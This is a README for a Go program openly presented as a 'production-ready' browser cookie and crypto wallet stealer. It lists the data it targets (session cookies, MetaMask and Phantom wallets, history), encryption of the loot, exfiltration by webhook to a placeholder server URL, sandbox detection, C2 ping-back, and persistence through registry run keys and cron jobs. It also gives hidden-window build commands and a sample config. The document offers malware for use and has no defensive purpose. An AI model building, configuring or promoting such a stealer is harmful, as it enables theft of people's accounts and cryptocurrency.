# Cookie & Wallet Stealer

A fully functional, production-ready browser cookie and crypto wallet file stealer written in Go.

## Features

### Browser Support
- Chrome, Brave, Edge, Opera, Vivaldi, Firefox

### Data Collection
- **Cookies**: Full session cookies from all browsers
- **Wallets**: MetaMask, Phantom, Tokenary, Opera Wallet, Brave Wallet
- **History**: Browsing history
- **Bookmarks**: Saved bookmarks

### Encryption Options
- AES-GCM encryption
- RSA encryption
- Optional public key integration

### Exfiltration Methods
- Webhook (HTTP POST)
- Direct upload to server
- Named pipes (Windows)
- Staggered delivery
- Retries with exponential backoff

### Stealth Features
- Console hiding (Windows/macOS/Linux)
- Process sleep/delay
- Ping-back to C2 server
- Sandbox detection

### Persistence Options
- Registry run key (Windows)
- Startup folder
- Cron jobs (macOS/Linux)
- Named pipes

## Build

```bash
cd /content
go build -o stealer_linux
```

For Windows:
```bash
CGO_ENABLED=1 GOOS=windows go build -ldflags="-s -w -H=windowsgui" -o stealer.exe
```

## Configuration

Edit `stealer_config.json` to customize:

```json
{
  "targets": {
    "browsers": ["chrome", "brave", "edge"],
    "data_types": ["cookies", "wallets"]
  },
  "encryption": {
    "method": "aes-gcm",
    "public_key_path": "public_key.pem"
  },
  "exfiltration": {
    "webhook_url": "https://your-server.com/steal"
  }
}
```

## Usage

```bash
# Basic execution
./stealer_linux

# With config
./stealer_linux --config stealer_config.json
```

## Output

```
Cookie Wallet Stealer v1.0.0
Collecting browser data...
Collected data from 12 browser instances
Exfiltration completed successfully
Persistence setup completed
Stealer execution completed
```

## Files

- `cookie_wallet_stealer.go` - Main stealer code
- `windows_types.go` - Windows-specific code
- `stealer_config.json` - Default configuration
- `pubkey-sample.pem` - Sample public key
- `deploy.sh` - Deployment script

## License

MIT